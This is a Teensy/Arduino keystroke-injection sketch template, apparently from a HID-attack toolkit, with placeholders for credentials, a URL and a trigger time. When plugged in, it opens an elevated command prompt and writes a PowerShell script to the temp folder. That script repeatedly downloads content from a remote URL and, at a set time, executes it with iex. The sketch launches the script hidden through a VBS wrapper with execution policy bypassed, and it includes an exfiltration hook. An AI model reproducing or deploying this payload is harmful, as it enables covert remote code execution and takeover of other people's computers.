#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }
  Keyboard.println("echo $user = \"INPUT1\" > %temp%\\te.ps1");
  Keyboard.println("echo $pass = \"INPUT2\" >> %temp%\\te.ps1");
  Keyboard.println("echo $dev = \"INPUT3\" >> %temp%\\te.ps1");
  Keyboard.println("echo while(1) { $exec = 0 >> %temp%\\te.ps1");
  Keyboard.println("echo sleep 20 >> %temp%\\te.ps1");
  Keyboard.println("echo $wc = New-Object System.Net.WebClient >> %temp%\\te.ps1");
  Keyboard.println("echo $fc = $wc.DownloadString(\"INPUT5\") >> %temp%\\te.ps1");
  Keyboard.println("echo $a = Get-Date -UFormat %R >> %temp%\\te.ps1");
  Keyboard.println("echo if ($a -match \"INPUT4\"){ >> %temp%\\te.ps1");
  Keyboard.println("echo iex ($wc.DownloadString(\"INPUT5\")); >> %temp%\\te.ps1");
  Keyboard.println("echo $exec++  >> %temp%\\te.ps1");
  Keyboard.println("echo if ($exec -eq 1){ sleep 60 }}  >> %temp%\\te.ps1");
  Keyboard.println("echo if ($fc -eq \"INPUT6\"){ break }} >> %temp%\\te.ps1");
 

  String fn = "te";
  EXFILCALLS

  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\te.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\te.ps1\"),0,true >> %temp%\\te.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\te.vbs");
  delay(1000);
  Keyboard.println("exit");
}

void loop(){
}

 DEFS
 EXFILDEFS